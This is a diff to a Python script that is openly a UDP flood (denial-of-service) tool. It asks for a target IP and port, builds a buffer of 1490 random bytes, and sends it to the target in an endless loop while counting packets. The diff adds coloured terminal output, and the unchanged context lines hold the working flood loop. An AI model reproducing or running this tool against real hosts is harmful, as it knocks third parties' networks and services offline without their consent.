@@ -6,6 +6,13 @@ import time
 from datetime import datetime
 
 
+#string colors
+OKBLUE = '\033[94m'
+ENDC = '\033[0m'
+BOLD = '\033[1m'
+WARNING = '\033[93m'
+FAIL = '\033[91m'
+
 #initialise the socket to use IPv4 & UDP protocole
 sockt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
@@ -30,12 +37,12 @@ pers_msg = input("Enter your personnal message or signatur if you wish: ")
 os.system("clear")
 os.system("figlet 'DDos Attack starting ...'")
 
-print("preparing the attacl of the adress IP:",ip )
+print(BOLD+OKBLUE+"preparing the attacl of the adress IP:",ip+ENDC+ENDC)
 time.sleep(5)
 sent = 0
 
 while True:
     sockt.sendto(bytes,(ip,port))
-    #sockt.send(bytes(pers_msg))
+    #sockt.send(pers_msg)
     sent +=1
-    print("number of request sent:",sent)
+    print(BOLD+"number of requests sent:",FAIL+str(sent)+ENDC+ENDC)
